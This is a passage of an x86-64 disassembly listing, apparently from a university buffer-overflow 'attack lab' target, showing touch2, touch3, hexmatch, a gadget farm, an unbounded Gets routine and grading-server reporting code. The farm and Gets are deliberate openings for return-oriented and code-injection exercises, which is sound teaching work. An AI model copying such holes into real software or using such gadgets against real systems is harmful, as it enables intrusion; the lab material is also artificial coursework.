  401f68:       48 8d 35 b1 23 00 00    lea    0x23b1(%rip),%rsi        # 404320 <_IO_stdin_used+0x320>
  401f6f:       bf 01 00 00 00          mov    $0x1,%edi
  401f74:       b8 00 00 00 00          mov    $0x0,%eax
  401f79:       e8 62 f4 ff ff          call   4013e0 <__printf_chk@plt>
  401f7e:       bf 02 00 00 00          mov    $0x2,%edi
  401f83:       e8 58 07 00 00          call   4026e0 <fail>
  401f88:       bf 00 00 00 00          mov    $0x0,%edi
  401f8d:       e8 9e f4 ff ff          call   401430 <exit@plt>
  401f92:       48 8d 35 5f 23 00 00    lea    0x235f(%rip),%rsi        # 4042f8 <_IO_stdin_used+0x2f8>
  401f99:       bf 01 00 00 00          mov    $0x1,%edi
  401f9e:       b8 00 00 00 00          mov    $0x0,%eax
  401fa3:       e8 38 f4 ff ff          call   4013e0 <__printf_chk@plt>
  401fa8:       bf 02 00 00 00          mov    $0x2,%edi
  401fad:       e8 5a 06 00 00          call   40260c <validate>
  401fb2:       eb d4                   jmp    401f88 <touch2+0x3e>

0000000000401fb4 <hexmatch>:
  401fb4:       f3 0f 1e fa             endbr64
  401fb8:       41 54                   push   %r12
  401fba:       55                      push   %rbp
  401fbb:       53                      push   %rbx
  401fbc:       48 83 c4 80             add    $0xffffffffffffff80,%rsp
  401fc0:       89 fd                   mov    %edi,%ebp
  401fc2:       48 89 f3                mov    %rsi,%rbx
  401fc5:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
  401fcc:       00 00
  401fce:       48 89 44 24 78          mov    %rax,0x78(%rsp)
  401fd3:       31 c0                   xor    %eax,%eax
  401fd5:       e8 d6 f3 ff ff          call   4013b0 <random@plt>
  401fda:       48 89 c1                mov    %rax,%rcx
  401fdd:       48 ba 0b d7 a3 70 3d    movabs $0xa3d70a3d70a3d70b,%rdx
  401fe4:       0a d7 a3
  401fe7:       48 f7 ea                imul   %rdx
  401fea:       48 01 ca                add    %rcx,%rdx
  401fed:       48 c1 fa 06             sar    $0x6,%rdx
  401ff1:       48 89 c8                mov    %rcx,%rax
  401ff4:       48 c1 f8 3f             sar    $0x3f,%rax
  401ff8:       48 29 c2                sub    %rax,%rdx
  401ffb:       48 8d 04 92             lea    (%rdx,%rdx,4),%rax
  401fff:       48 8d 04 80             lea    (%rax,%rax,4),%rax
  402003:       48 c1 e0 02             shl    $0x2,%rax
  402007:       48 29 c1                sub    %rax,%rcx
  40200a:       4c 8d 24 0c             lea    (%rsp,%rcx,1),%r12
  40200e:       41 89 e8                mov    %ebp,%r8d
  402011:       48 8d 0d db 22 00 00    lea    0x22db(%rip),%rcx        # 4042f3 <_IO_stdin_used+0x2f3>
  402018:       48 c7 c2 ff ff ff ff    mov    $0xffffffffffffffff,%rdx
  40201f:       be 01 00 00 00          mov    $0x1,%esi
  402024:       4c 89 e7                mov    %r12,%rdi
  402027:       b8 00 00 00 00          mov    $0x0,%eax
  40202c:       e8 3f f4 ff ff          call   401470 <__sprintf_chk@plt>
  402031:       ba 09 00 00 00          mov    $0x9,%edx
  402036:       4c 89 e6                mov    %r12,%rsi
  402039:       48 89 df                mov    %rbx,%rdi
  40203c:       e8 4f f2 ff ff          call   401290 <strncmp@plt>
  402041:       85 c0                   test   %eax,%eax
  402043:       0f 94 c0                sete   %al
  402046:       48 8b 54 24 78          mov    0x78(%rsp),%rdx
  40204b:       64 48 2b 14 25 28 00    sub    %fs:0x28,%rdx
  402052:       00 00
  402054:       75 0c                   jne    402062 <hexmatch+0xae>
  402056:       0f b6 c0                movzbl %al,%eax
  402059:       48 83 ec 80             sub    $0xffffffffffffff80,%rsp
  40205d:       5b                      pop    %rbx
  40205e:       5d                      pop    %rbp
  40205f:       41 5c                   pop    %r12
  402061:       c3                      ret
  402062:       e8 89 f2 ff ff          call   4012f0 <__stack_chk_fail@plt>

0000000000402067 <touch3>:
  402067:       f3 0f 1e fa             endbr64
  40206b:       53                      push   %rbx
  40206c:       48 89 fb                mov    %rdi,%rbx
  40206f:       c7 05 d3 54 00 00 03    movl   $0x3,0x54d3(%rip)        # 40754c <vlevel>
  402076:       00 00 00
  402079:       48 89 fe                mov    %rdi,%rsi
  40207c:       8b 3d d2 54 00 00       mov    0x54d2(%rip),%edi        # 407554 <cookie>
  402082:       e8 2d ff ff ff          call   401fb4 <hexmatch>
  402087:       85 c0                   test   %eax,%eax
  402089:       74 2d                   je     4020b8 <touch3+0x51>
  40208b:       48 89 da                mov    %rbx,%rdx
  40208e:       48 8d 35 b3 22 00 00    lea    0x22b3(%rip),%rsi        # 404348 <_IO_stdin_used+0x348>
  402095:       bf 01 00 00 00          mov    $0x1,%edi
  40209a:       b8 00 00 00 00          mov    $0x0,%eax
  40209f:       e8 3c f3 ff ff          call   4013e0 <__printf_chk@plt>
  4020a4:       bf 03 00 00 00          mov    $0x3,%edi
  4020a9:       e8 5e 05 00 00          call   40260c <validate>
  4020ae:       bf 00 00 00 00          mov    $0x0,%edi
  4020b3:       e8 78 f3 ff ff          call   401430 <exit@plt>
  4020b8:       48 89 da                mov    %rbx,%rdx
  4020bb:       48 8d 35 ae 22 00 00    lea    0x22ae(%rip),%rsi        # 404370 <_IO_stdin_used+0x370>
  4020c2:       bf 01 00 00 00          mov    $0x1,%edi
  4020c7:       b8 00 00 00 00          mov    $0x0,%eax
  4020cc:       e8 0f f3 ff ff          call   4013e0 <__printf_chk@plt>
  4020d1:       bf 03 00 00 00          mov    $0x3,%edi
  4020d6:       e8 05 06 00 00          call   4026e0 <fail>
  4020db:       eb d1                   jmp    4020ae <touch3+0x47>

00000000004020dd <test>:
  4020dd:       f3 0f 1e fa             endbr64
  4020e1:       48 83 ec 08             sub    $0x8,%rsp
  4020e5:       b8 00 00 00 00          mov    $0x0,%eax
  4020ea:       e8 0d fe ff ff          call   401efc <getbuf>
  4020ef:       89 c2                   mov    %eax,%edx
  4020f1:       48 8d 35 a0 22 00 00    lea    0x22a0(%rip),%rsi        # 404398 <_IO_stdin_used+0x398>
  4020f8:       bf 01 00 00 00          mov    $0x1,%edi
  4020fd:       b8 00 00 00 00          mov    $0x0,%eax
  402102:       e8 d9 f2 ff ff          call   4013e0 <__printf_chk@plt>
  402107:       48 83 c4 08             add    $0x8,%rsp
  40210b:       c3                      ret

000000000040210c <start_farm>:
  40210c:       f3 0f 1e fa             endbr64
  402110:       b8 01 00 00 00          mov    $0x1,%eax
  402115:       c3                      ret

0000000000402116 <getval_270>:
  402116:       f3 0f 1e fa             endbr64
  40211a:       b8 c2 48 89 c7          mov    $0xc78948c2,%eax
  40211f:       c3                      ret

0000000000402120 <getval_442>:
  402120:       f3 0f 1e fa             endbr64
  402124:       b8 48 89 c7 c2          mov    $0xc2c78948,%eax
  402129:       c3                      ret

000000000040212a <addval_244>:
  40212a:       f3 0f 1e fa             endbr64
  40212e:       8d 87 08 48 c9 c7       lea    -0x3836b7f8(%rdi),%eax
  402134:       c3                      ret

0000000000402135 <getval_349>:
  402135:       f3 0f 1e fa             endbr64
  402139:       b8 97 48 89 c7          mov    $0xc7894897,%eax
  40213e:       c3                      ret

000000000040213f <addval_495>:
  40213f:       f3 0f 1e fa             endbr64
  402143:       8d 87 12 56 f4 50       lea    0x50f45612(%rdi),%eax
  402149:       c3                      ret

000000000040214a <addval_446>:
  40214a:       f3 0f 1e fa             endbr64
  40214e:       8d 87 58 90 90 90       lea    -0x6f6f6fa8(%rdi),%eax
  402154:       c3                      ret

0000000000402155 <addval_177>:
  402155:       f3 0f 1e fa             endbr64
  402159:       8d 87 58 90 92 c3       lea    -0x3c6d6fa8(%rdi),%eax
  40215f:       c3                      ret

0000000000402160 <addval_153>:
  402160:       f3 0f 1e fa             endbr64
  402164:       8d 87 ed 3d 58 c3       lea    -0x3ca7c213(%rdi),%eax
  40216a:       c3                      ret

000000000040216b <mid_farm>:
  40216b:       f3 0f 1e fa             endbr64
  40216f:       b8 01 00 00 00          mov    $0x1,%eax
  402174:       c3                      ret

0000000000402175 <add_xy>:
  402175:       f3 0f 1e fa             endbr64
  402179:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  40217d:       c3                      ret

000000000040217e <getval_433>:
  40217e:       f3 0f 1e fa             endbr64
  402182:       b8 8d c2 90 90          mov    $0x9090c28d,%eax
  402187:       c3                      ret

0000000000402188 <getval_384>:
  402188:       f3 0f 1e fa             endbr64
  40218c:       b8 09 ce 38 d2          mov    $0xd238ce09,%eax
  402191:       c3                      ret

0000000000402192 <setval_157>:
  402192:       f3 0f 1e fa             endbr64
  402196:       c7 07 81 c2 38 c0       movl   $0xc038c281,(%rdi)
  40219c:       c3                      ret

000000000040219d <addval_404>:
  40219d:       f3 0f 1e fa             endbr64
  4021a1:       8d 87 89 d1 90 c1       lea    -0x3e6f2e77(%rdi),%eax
  4021a7:       c3                      ret

00000000004021a8 <addval_437>:
  4021a8:       f3 0f 1e fa             endbr64
  4021ac:       8d 87 99 c2 90 c3       lea    -0x3c6f3d67(%rdi),%eax
  4021b2:       c3                      ret

00000000004021b3 <getval_141>:
  4021b3:       f3 0f 1e fa             endbr64
  4021b7:       b8 c9 d1 08 db          mov    $0xdb08d1c9,%eax
  4021bc:       c3                      ret

00000000004021bd <setval_249>:
  4021bd:       f3 0f 1e fa             endbr64
  4021c1:       c7 07 89 ce 60 d2       movl   $0xd260ce89,(%rdi)
  4021c7:       c3                      ret

00000000004021c8 <addval_165>:
  4021c8:       f3 0f 1e fa             endbr64
  4021cc:       8d 87 98 89 d1 90       lea    -0x6f2e7668(%rdi),%eax
  4021d2:       c3                      ret

00000000004021d3 <addval_106>:
  4021d3:       f3 0f 1e fa             endbr64
  4021d7:       8d 87 48 89 e0 92       lea    -0x6d1f76b8(%rdi),%eax
  4021dd:       c3                      ret

00000000004021de <getval_335>:
  4021de:       f3 0f 1e fa             endbr64
  4021e2:       b8 89 c2 92 90          mov    $0x9092c289,%eax
  4021e7:       c3                      ret

00000000004021e8 <addval_168>:
  4021e8:       f3 0f 1e fa             endbr64
  4021ec:       8d 87 99 ce 38 d2       lea    -0x2dc73167(%rdi),%eax
  4021f2:       c3                      ret

00000000004021f3 <getval_461>:
  4021f3:       f3 0f 1e fa             endbr64
  4021f7:       b8 89 c2 90 c3          mov    $0xc390c289,%eax
  4021fc:       c3                      ret

00000000004021fd <addval_297>:
  4021fd:       f3 0f 1e fa             endbr64
  402201:       8d 87 88 d1 84 d2       lea    -0x2d7b2e78(%rdi),%eax
  402207:       c3                      ret

0000000000402208 <getval_210>:
  402208:       f3 0f 1e fa             endbr64
  40220c:       b8 48 09 e0 c3          mov    $0xc3e00948,%eax
  402211:       c3                      ret

0000000000402212 <setval_487>:
  402212:       f3 0f 1e fa             endbr64
  402216:       c7 07 89 c2 30 db       movl   $0xdb30c289,(%rdi)
  40221c:       c3                      ret

000000000040221d <getval_381>:
  40221d:       f3 0f 1e fa             endbr64
  402221:       b8 89 ce 84 c9          mov    $0xc984ce89,%eax
  402226:       c3                      ret

0000000000402227 <addval_287>:
  402227:       f3 0f 1e fa             endbr64
  40222b:       8d 87 2e c8 89 e0       lea    -0x1f7637d2(%rdi),%eax
  402231:       c3                      ret

0000000000402232 <setval_152>:
  402232:       f3 0f 1e fa             endbr64
  402236:       c7 07 88 d1 08 c0       movl   $0xc008d188,(%rdi)
  40223c:       c3                      ret

000000000040223d <getval_279>:
  40223d:       f3 0f 1e fa             endbr64
  402241:       b8 60 48 89 e0          mov    $0xe0894860,%eax
  402246:       c3                      ret

0000000000402247 <setval_185>:
  402247:       f3 0f 1e fa             endbr64
  40224b:       c7 07 48 89 e0 c3       movl   $0xc3e08948,(%rdi)
  402251:       c3                      ret

0000000000402252 <addval_318>:
  402252:       f3 0f 1e fa             endbr64
  402256:       8d 87 4a 89 e0 90       lea    -0x6f1f76b6(%rdi),%eax
  40225c:       c3                      ret

000000000040225d <addval_122>:
  40225d:       f3 0f 1e fa             endbr64
  402261:       8d 87 4b 63 8d ce       lea    -0x31729cb5(%rdi),%eax
  402267:       c3                      ret

0000000000402268 <setval_332>:
  402268:       f3 0f 1e fa             endbr64
  40226c:       c7 07 48 88 e0 90       movl   $0x90e08848,(%rdi)
  402272:       c3                      ret

0000000000402273 <addval_126>:
  402273:       f3 0f 1e fa             endbr64
  402277:       8d 87 89 ce 28 c0       lea    -0x3fd73177(%rdi),%eax
  40227d:       c3                      ret

000000000040227e <getval_146>:
  40227e:       f3 0f 1e fa             endbr64
  402282:       b8 81 ce 84 c0          mov    $0xc084ce81,%eax
  402287:       c3                      ret

0000000000402288 <setval_456>:
  402288:       f3 0f 1e fa             endbr64
  40228c:       c7 07 d9 49 88 d1       movl   $0xd18849d9,(%rdi)
  402292:       c3                      ret

0000000000402293 <setval_266>:
  402293:       f3 0f 1e fa             endbr64
  402297:       c7 07 89 d1 38 c0       movl   $0xc038d189,(%rdi)
  40229d:       c3                      ret

000000000040229e <addval_410>:
  40229e:       f3 0f 1e fa             endbr64
  4022a2:       8d 87 89 c2 90 c7       lea    -0x386f3d77(%rdi),%eax
  4022a8:       c3                      ret

00000000004022a9 <getval_392>:
  4022a9:       f3 0f 1e fa             endbr64
  4022ad:       b8 4c 89 e0 90          mov    $0x90e0894c,%eax
  4022b2:       c3                      ret

00000000004022b3 <getval_308>:
  4022b3:       f3 0f 1e fa             endbr64
  4022b7:       b8 8b d1 20 c9          mov    $0xc920d18b,%eax
  4022bc:       c3                      ret

00000000004022bd <addval_393>:
  4022bd:       f3 0f 1e fa             endbr64
  4022c1:       8d 87 89 c2 08 c9       lea    -0x36f73d77(%rdi),%eax
  4022c7:       c3                      ret

00000000004022c8 <addval_149>:
  4022c8:       f3 0f 1e fa             endbr64
  4022cc:       8d 87 89 ce 84 c9       lea    -0x367b3177(%rdi),%eax
  4022d2:       c3                      ret

00000000004022d3 <end_farm>:
  4022d3:       f3 0f 1e fa             endbr64
  4022d7:       b8 01 00 00 00          mov    $0x1,%eax
  4022dc:       c3                      ret

00000000004022dd <save_char>:
  4022dd:       8b 05 81 5e 00 00       mov    0x5e81(%rip),%eax        # 408164 <gets_cnt>
  4022e3:       3d ff 03 00 00          cmp    $0x3ff,%eax
  4022e8:       7f 4a                   jg     402334 <save_char+0x57>
  4022ea:       89 f9                   mov    %edi,%ecx
  4022ec:       c0 e9 04                shr    $0x4,%cl
  4022ef:       8d 14 40                lea    (%rax,%rax,2),%edx
  4022f2:       4c 8d 05 c7 23 00 00    lea    0x23c7(%rip),%r8        # 4046c0 <trans_char>
  4022f9:       83 e1 0f                and    $0xf,%ecx
  4022fc:       45 0f b6 0c 08          movzbl (%r8,%rcx,1),%r9d
  402301:       48 8d 0d 58 52 00 00    lea    0x5258(%rip),%rcx        # 407560 <gets_buf>
  402308:       48 63 f2                movslq %edx,%rsi
  40230b:       44 88 0c 31             mov    %r9b,(%rcx,%rsi,1)
  40230f:       8d 72 01                lea    0x1(%rdx),%esi
  402312:       83 e7 0f                and    $0xf,%edi
  402315:       41 0f b6 3c 38          movzbl (%r8,%rdi,1),%edi
  40231a:       48 63 f6                movslq %esi,%rsi
  40231d:       40 88 3c 31             mov    %dil,(%rcx,%rsi,1)
  402321:       83 c2 02                add    $0x2,%edx
  402324:       48 63 d2                movslq %edx,%rdx
  402327:       c6 04 11 20             movb   $0x20,(%rcx,%rdx,1)
  40232b:       83 c0 01                add    $0x1,%eax
  40232e:       89 05 30 5e 00 00       mov    %eax,0x5e30(%rip)        # 408164 <gets_cnt>
  402334:       c3                      ret

0000000000402335 <save_term>:
  402335:       8b 05 29 5e 00 00       mov    0x5e29(%rip),%eax        # 408164 <gets_cnt>
  40233b:       8d 04 40                lea    (%rax,%rax,2),%eax
  40233e:       48 98                   cltq
  402340:       48 8d 15 19 52 00 00    lea    0x5219(%rip),%rdx        # 407560 <gets_buf>
  402347:       c6 04 02 00             movb   $0x0,(%rdx,%rax,1)
  40234b:       c3                      ret

000000000040234c <check_fail>:
  40234c:       f3 0f 1e fa             endbr64
  402350:       50                      push   %rax
  402351:       58                      pop    %rax
  402352:       48 83 ec 08             sub    $0x8,%rsp
  402356:       0f be 15 db 51 00 00    movsbl 0x51db(%rip),%edx        # 407538 <target_prefix>
  40235d:       4c 8d 05 fc 51 00 00    lea    0x51fc(%rip),%r8        # 407560 <gets_buf>
  402364:       8b 0d de 51 00 00       mov    0x51de(%rip),%ecx        # 407548 <check_level>
  40236a:       48 8d 35 4a 20 00 00    lea    0x204a(%rip),%rsi        # 4043bb <_IO_stdin_used+0x3bb>
  402371:       bf 01 00 00 00          mov    $0x1,%edi
  402376:       b8 00 00 00 00          mov    $0x0,%eax
  40237b:       e8 60 f0 ff ff          call   4013e0 <__printf_chk@plt>
  402380:       bf 01 00 00 00          mov    $0x1,%edi
  402385:       e8 a6 f0 ff ff          call   401430 <exit@plt>

000000000040238a <Gets>:
  40238a:       f3 0f 1e fa             endbr64
  40238e:       41 54                   push   %r12
  402390:       55                      push   %rbp
  402391:       53                      push   %rbx
  402392:       49 89 fc                mov    %rdi,%r12
  402395:       c7 05 c5 5d 00 00 00    movl   $0x0,0x5dc5(%rip)        # 408164 <gets_cnt>
  40239c:       00 00 00
  40239f:       48 89 fb                mov    %rdi,%rbx
  4023a2:       eb 11                   jmp    4023b5 <Gets+0x2b>
  4023a4:       48 8d 6b 01             lea    0x1(%rbx),%rbp
  4023a8:       88 03                   mov    %al,(%rbx)
  4023aa:       0f b6 f8                movzbl %al,%edi
  4023ad:       e8 2b ff ff ff          call   4022dd <save_char>
  4023b2:       48 89 eb                mov    %rbp,%rbx
  4023b5:       48 8b 3d 84 51 00 00    mov    0x5184(%rip),%rdi        # 407540 <infile>
  4023bc:       e8 9f f0 ff ff          call   401460 <getc@plt>
  4023c1:       83 f8 ff                cmp    $0xffffffff,%eax
  4023c4:       74 05                   je     4023cb <Gets+0x41>
  4023c6:       83 f8 0a                cmp    $0xa,%eax
  4023c9:       75 d9                   jne    4023a4 <Gets+0x1a>
  4023cb:       c6 03 00                movb   $0x0,(%rbx)
  4023ce:       b8 00 00 00 00          mov    $0x0,%eax
  4023d3:       e8 5d ff ff ff          call   402335 <save_term>
  4023d8:       4c 89 e0                mov    %r12,%rax
  4023db:       5b                      pop    %rbx
  4023dc:       5d                      pop    %rbp
  4023dd:       41 5c                   pop    %r12
  4023df:       c3                      ret

00000000004023e0 <notify_server>:
  4023e0:       f3 0f 1e fa             endbr64
  4023e4:       55                      push   %rbp
  4023e5:       53                      push   %rbx
  4023e6:       4c 8d 9c 24 00 c0 ff    lea    -0x4000(%rsp),%r11
  4023ed:       ff
  4023ee:       48 81 ec 00 10 00 00    sub    $0x1000,%rsp
  4023f5:       48 83 0c 24 00          orq    $0x0,(%rsp)
  4023fa:       4c 39 dc                cmp    %r11,%rsp
  4023fd:       75 ef                   jne    4023ee <notify_server+0xe>
  4023ff:       48 83 ec 18             sub    $0x18,%rsp
  402403:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
  40240a:       00 00
  40240c:       48 89 84 24 08 40 00    mov    %rax,0x4008(%rsp)
  402413:       00
  402414:       31 c0                   xor    %eax,%eax
  402416:       83 3d 3b 51 00 00 00    cmpl   $0x0,0x513b(%rip)        # 407558 <is_checker>
  40241d:       0f 85 35 01 00 00       jne    402558 <notify_server+0x178>
  402423:       89 fb                   mov    %edi,%ebx
  402425:       81 3d 35 5d 00 00 9c    cmpl   $0x1f9c,0x5d35(%rip)        # 408164 <gets_cnt>
  40242c:       1f 00 00
  40242f:       0f 8f be 00 00 00       jg     4024f3 <notify_server+0x113>
  402435:       0f be 05 fc 50 00 00    movsbl 0x50fc(%rip),%eax        # 407538 <target_prefix>
  40243c:       83 3d 65 50 00 00 00    cmpl   $0x0,0x5065(%rip)        # 4074a8 <notify>
  402443:       0f 84 c5 00 00 00       je     40250e <notify_server+0x12e>
  402449:       8b 15 01 51 00 00       mov    0x5101(%rip),%edx        # 407550 <authkey>
  40244f:       85 db                   test   %ebx,%ebx
  402451:       0f 84 c1 00 00 00       je     402518 <notify_server+0x138>
  402457:       48 8d 2d 73 1f 00 00    lea    0x1f73(%rip),%rbp        # 4043d1 <_IO_stdin_used+0x3d1>
  40245e:       48 89 e7                mov    %rsp,%rdi
  402461:       48 8d 0d f8 50 00 00    lea    0x50f8(%rip),%rcx        # 407560 <gets_buf>
  402468:       51                      push   %rcx
  402469:       56                      push   %rsi
  40246a:       50                      push   %rax
  40246b:       52                      push   %rdx
  40246c:       49 89 e9                mov    %rbp,%r9
  40246f:       44 8b 05 da 4c 00 00    mov    0x4cda(%rip),%r8d        # 407150 <target_id>
  402476:       48 8d 0d 5e 1f 00 00    lea    0x1f5e(%rip),%rcx        # 4043db <_IO_stdin_used+0x3db>
  40247d:       ba 00 20 00 00          mov    $0x2000,%edx
  402482:       be 01 00 00 00          mov    $0x1,%esi
  402487:       b8 00 00 00 00          mov    $0x0,%eax
  40248c:       e8 df ef ff ff          call   401470 <__sprintf_chk@plt>
  402491:       48 83 c4 20             add    $0x20,%rsp
  402495:       83 3d 0c 50 00 00 00    cmpl   $0x0,0x500c(%rip)        # 4074a8 <notify>
  40249c:       0f 84 d7 00 00 00       je     402579 <notify_server+0x199>
  4024a2:       85 db                   test   %ebx,%ebx
  4024a4:       0f 84 a2 00 00 00       je     40254c <notify_server+0x16c>
  4024aa:       48 89 e1                mov    %rsp,%rcx
  4024ad:       4c 8d 8c 24 00 20 00    lea    0x2000(%rsp),%r9
  4024b4:       00
  4024b5:       41 b8 00 00 00 00       mov    $0x0,%r8d
  4024bb:       48 8b 15 a6 4c 00 00    mov    0x4ca6(%rip),%rdx        # 407168 <lab>
  4024c2:       48 8b 35 d7 4f 00 00    mov    0x4fd7(%rip),%rsi        # 4074a0 <course>
  4024c9:       48 8b 3d 90 4c 00 00    mov    0x4c90(%rip),%rdi        # 407160 <user_id>
  4024d0:       e8 ce 11 00 00          call   4036a3 <driver_post>
  4024d5:       85 c0                   test   %eax,%eax
  4024d7:       78 4b                   js     402524 <notify_server+0x144>
  4024d9:       48 8d 3d 40 20 00 00    lea    0x2040(%rip),%rdi        # 404520 <_IO_stdin_used+0x520>
  4024e0:       e8 db ed ff ff          call   4012c0 <puts@plt>
  4024e5:       48 8d 3d 17 1f 00 00    lea    0x1f17(%rip),%rdi        # 404403 <_IO_stdin_used+0x403>
  4024ec:       e8 cf ed ff ff          call   4012c0 <puts@plt>
  4024f1:       eb 65                   jmp    402558 <notify_server+0x178>
  4024f3:       48 8d 35 f6 1f 00 00    lea    0x1ff6(%rip),%rsi        # 4044f0 <_IO_stdin_used+0x4f0>
  4024fa:       bf 01 00 00 00          mov    $0x1,%edi
  4024ff:       e8 dc ee ff ff          call   4013e0 <__printf_chk@plt>
  402504:       bf 01 00 00 00          mov    $0x1,%edi
  402509:       e8 22 ef ff ff          call   401430 <exit@plt>
  40250e:       ba ff ff ff ff          mov    $0xffffffff,%edx
  402513:       e9 37 ff ff ff          jmp    40244f <notify_server+0x6f>
  402518:       48 8d 2d b7 1e 00 00    lea    0x1eb7(%rip),%rbp        # 4043d6 <_IO_stdin_used+0x3d6>
  40251f:       e9 3a ff ff ff          jmp    40245e <notify_server+0x7e>
  402524:       48 8d 94 24 00 20 00    lea    0x2000(%rsp),%rdx
  40252b:       00
  40252c:       48 8d 35 c4 1e 00 00    lea    0x1ec4(%rip),%rsi        # 4043f7 <_IO_stdin_used+0x3f7>
  402533:       bf 01 00 00 00          mov    $0x1,%edi
  402538:       b8 00 00 00 00          mov    $0x0,%eax
  40253d:       e8 9e ee ff ff          call   4013e0 <__printf_chk@plt>
  402542:       bf 01 00 00 00          mov    $0x1,%edi
  402547:       e8 e4 ee ff ff          call   401430 <exit@plt>
  40254c:       48 8d 3d ba 1e 00 00    lea    0x1eba(%rip),%rdi        # 40440d <_IO_stdin_used+0x40d>
  402553:       e8 68 ed ff ff          call   4012c0 <puts@plt>
  402558:       48 8b 84 24 08 40 00    mov    0x4008(%rsp),%rax
  40255f:       00
  402560:       64 48 2b 04 25 28 00    sub    %fs:0x28,%rax
  402567:       00 00
  402569:       0f 85 98 00 00 00       jne    402607 <notify_server+0x227>
  40256f:       48 81 c4 18 40 00 00    add    $0x4018,%rsp
  402576:       5b                      pop    %rbx
  402577:       5d                      pop    %rbp
  402578:       c3                      ret
  402579:       48 89 ea                mov    %rbp,%rdx
  40257c:       48 8d 35 d5 1f 00 00    lea    0x1fd5(%rip),%rsi        # 404558 <_IO_stdin_used+0x558>
  402583:       bf 01 00 00 00          mov    $0x1,%edi
  402588:       b8 00 00 00 00          mov    $0x0,%eax
  40258d:       e8 4e ee ff ff          call   4013e0 <__printf_chk@plt>
  402592:       48 8b 15 c7 4b 00 00    mov    0x4bc7(%rip),%rdx        # 407160 <user_id>
  402599:       48 8d 35 74 1e 00 00    lea    0x1e74(%rip),%rsi        # 404414 <_IO_stdin_used+0x414>
  4025a0:       bf 01 00 00 00          mov    $0x1,%edi
  4025a5:       b8 00 00 00 00          mov    $0x0,%eax
  4025aa:       e8 31 ee ff ff          call   4013e0 <__printf_chk@plt>
  4025af:       48 8b 15 ea 4e 00 00    mov    0x4eea(%rip),%rdx        # 4074a0 <course>
  4025b6:       48 8d 35 64 1e 00 00    lea    0x1e64(%rip),%rsi        # 404421 <_IO_stdin_used+0x421>
  4025bd:       bf 01 00 00 00          mov    $0x1,%edi
  4025c2:       b8 00 00 00 00          mov    $0x0,%eax
  4025c7:       e8 14 ee ff ff          call   4013e0 <__printf_chk@plt>
  4025cc:       48 8b 15 95 4b 00 00    mov    0x4b95(%rip),%rdx        # 407168 <lab>
  4025d3:       48 8d 35 53 1e 00 00    lea    0x1e53(%rip),%rsi        # 40442d <_IO_stdin_used+0x42d>
  4025da:       bf 01 00 00 00          mov    $0x1,%edi
  4025df:       b8 00 00 00 00          mov    $0x0,%eax
  4025e4:       e8 f7 ed ff ff          call   4013e0 <__printf_chk@plt>
  4025e9:       48 89 e2                mov    %rsp,%rdx
  4025ec:       48 8d 35 43 1e 00 00    lea    0x1e43(%rip),%rsi        # 404436 <_IO_stdin_used+0x436>
  4025f3:       bf 01 00 00 00          mov    $0x1,%edi
  4025f8:       b8 00 00 00 00          mov    $0x0,%eax
  4025fd:       e8 de ed ff ff          call   4013e0 <__printf_chk@plt>
  402602:       e9 51 ff ff ff          jmp    402558 <notify_server+0x178>
  402607:       e8 e4 ec ff ff          call   4012f0 <__stack_chk_fail@plt>

000000000040260c <validate>:
  40260c:       f3 0f 1e fa             endbr64
  402610:       53                      push   %rbx
  402611:       89 fb                   mov    %edi,%ebx
  402613:       83 3d 3e 4f 00 00 00    cmpl   $0x0,0x4f3e(%rip)        # 407558 <is_checker>
  40261a:       74 72                   je     40268e <validate+0x82>
  40261c:       39 3d 2a 4f 00 00       cmp    %edi,0x4f2a(%rip)        # 40754c <vlevel>
  402622:       75 32                   jne    402656 <validate+0x4a>
  402624:       8b 15 1e 4f 00 00       mov    0x4f1e(%rip),%edx        # 407548 <check_level>
  40262a:       39 fa                   cmp    %edi,%edx
  40262c:       75 3e                   jne    40266c <validate+0x60>
  40262e:       0f be 15 03 4f 00 00    movsbl 0x4f03(%rip),%edx        # 407538 <target_prefix>
  402635:       4c 8d 05 24 4f 00 00    lea    0x4f24(%rip),%r8        # 407560 <gets_buf>
  40263c:       89 f9                   mov    %edi,%ecx
  40263e:       48 8d 35 1b 1e 00 00    lea    0x1e1b(%rip),%rsi        # 404460 <_IO_stdin_used+0x460>
  402645:       bf 01 00 00 00          mov    $0x1,%edi
  40264a:       b8 00 00 00 00          mov    $0x0,%eax
  40264f:       e8 8c ed ff ff          call   4013e0 <__printf_chk@plt>
  402654:       5b                      pop    %rbx
  402655:       c3                      ret
  402656:       48 8d 3d e5 1d 00 00    lea    0x1de5(%rip),%rdi        # 404442 <_IO_stdin_used+0x442>
  40265d:       e8 5e ec ff ff          call   4012c0 <puts@plt>
  402662:       b8 00 00 00 00          mov    $0x0,%eax
  402667:       e8 e0 fc ff ff          call   40234c <check_fail>
  40266c:       89 f9                   mov    %edi,%ecx
  40266e:       48 8d 35 0b 1f 00 00    lea    0x1f0b(%rip),%rsi        # 404580 <_IO_stdin_used+0x580>
  402675:       bf 01 00 00 00          mov    $0x1,%edi
  40267a:       b8 00 00 00 00          mov    $0x0,%eax
  40267f:       e8 5c ed ff ff          call   4013e0 <__printf_chk@plt>
  402684:       b8 00 00 00 00          mov    $0x0,%eax
  402689:       e8 be fc ff ff          call   40234c <check_fail>
  40268e:       39 3d b8 4e 00 00       cmp    %edi,0x4eb8(%rip)        # 40754c <vlevel>
  402694:       74 1a                   je     4026b0 <validate+0xa4>
  402696:       48 8d 3d a5 1d 00 00    lea    0x1da5(%rip),%rdi        # 404442 <_IO_stdin_used+0x442>
  40269d:       e8 1e ec ff ff          call   4012c0 <puts@plt>
  4026a2:       89 de                   mov    %ebx,%esi
  4026a4:       bf 00 00 00 00          mov    $0x0,%edi
  4026a9:       e8 32 fd ff ff          call   4023e0 <notify_server>
  4026ae:       eb a4                   jmp    402654 <validate+0x48>
  4026b0:       0f be 0d 81 4e 00 00    movsbl 0x4e81(%rip),%ecx        # 407538 <target_prefix>
  4026b7:       89 fa                   mov    %edi,%edx
  4026b9:       48 8d 35 e8 1e 00 00    lea    0x1ee8(%rip),%rsi        # 4045a8 <_IO_stdin_used+0x5a8>
  4026c0:       bf 01 00 00 00          mov    $0x1,%edi
  4026c5:       b8 00 00 00 00          mov    $0x0,%eax
  4026ca:       e8 11 ed ff ff          call   4013e0 <__printf_chk@plt>
  4026cf:       89 de                   mov    %ebx,%esi
  4026d1:       bf 01 00 00 00          mov    $0x1,%edi
  4026d6:       e8 05 fd ff ff          call   4023e0 <notify_server>
